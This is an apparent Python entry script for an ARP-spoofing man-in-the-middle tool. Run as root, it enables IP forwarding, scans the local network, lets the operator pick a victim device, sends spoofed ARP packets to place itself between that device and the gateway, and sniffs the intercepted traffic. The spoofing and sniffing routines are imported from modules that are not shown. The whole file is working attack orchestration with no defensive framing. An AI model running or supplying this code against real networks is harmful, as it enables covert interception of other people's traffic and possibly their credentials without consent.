import os
import threading

from helpers.utils import is_sudo
from helpers.network import get_interface_names, get_interface_ip
from modules.arp_spoof import arp_scan, allow_ip_forwarding, send_spoof_packets, packet_sniffer, print_arp_res

def main():
    if not is_sudo():
        print("Run the script with sudo.")
        exit()

    # Get default interface
    interfaces = [i for i in get_interface_names() if i not in ["lo", "docker0"]]
    if "wlan0" in interfaces:
        main_iface = "wlan0"
    elif interfaces:
        main_iface = interfaces[0]
    else:
        print("No valid network interface found.")
        exit()

    # Get IP range from interface
    ip_range = get_interface_ip(main_iface)
    print(f"[*] Scanning network on interface '{main_iface}' with range {ip_range}")

    allow_ip_forwarding()
    arp_res = arp_scan(ip_range)
    if not arp_res:
        print("No devices found.")
        exit()

    gateway_info = arp_res[0]
    clients = arp_res[1:]
    if not clients:
        print("No clients found.")
        exit()

    choice = print_arp_res(clients)
    node_to_spoof = clients[choice]

    t = threading.Thread(target=send_spoof_packets, args=(gateway_info, node_to_spoof), daemon=True)
    t.start()

    packet_sniffer(main_iface)

if __name__ == "__main__":
    main()
